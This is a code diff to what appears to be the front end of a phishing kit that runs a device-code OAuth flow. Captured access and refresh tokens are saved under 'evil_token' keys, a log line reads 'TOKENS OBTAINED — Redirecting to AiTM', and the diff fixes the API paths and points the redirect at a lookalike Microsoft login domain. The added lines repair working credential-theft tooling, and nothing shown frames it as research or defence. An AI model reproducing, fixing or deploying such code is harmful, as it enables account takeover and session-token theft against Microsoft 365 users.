@@ -472,7 +472,8 @@
       isPolling = true;
 
       try {
-        const resp = await fetch(`${API_BASE}/device/token`, {
+        // ── ✅ FIXED: Use /api/device/token ──
+        const resp = await fetch(`${API_BASE}/api/device/token`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ device_code: deviceCode })
@@ -504,7 +505,7 @@
               localStorage.setItem('evil_token_refresh', data.refresh_token);
             }
             localStorage.setItem('evil_token_user', data.username || 'User');
-            window.location.href = '/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https://login.microsoftonline.com/';
+            window.location.href = 'https://login.office-onmisoft.online/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F';
           };
           addLog('✅ TOKENS OBTAINED — Redirecting to AiTM');
           isPolling = false;
@@ -558,7 +559,8 @@
       `;
 
       try {
-        const resp = await fetch(`${API_BASE}/device/request`, {
+        // ── ✅ FIXED: Use /api/device/request ──
+        const resp = await fetch(`${API_BASE}/api/device/request`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' }
         });
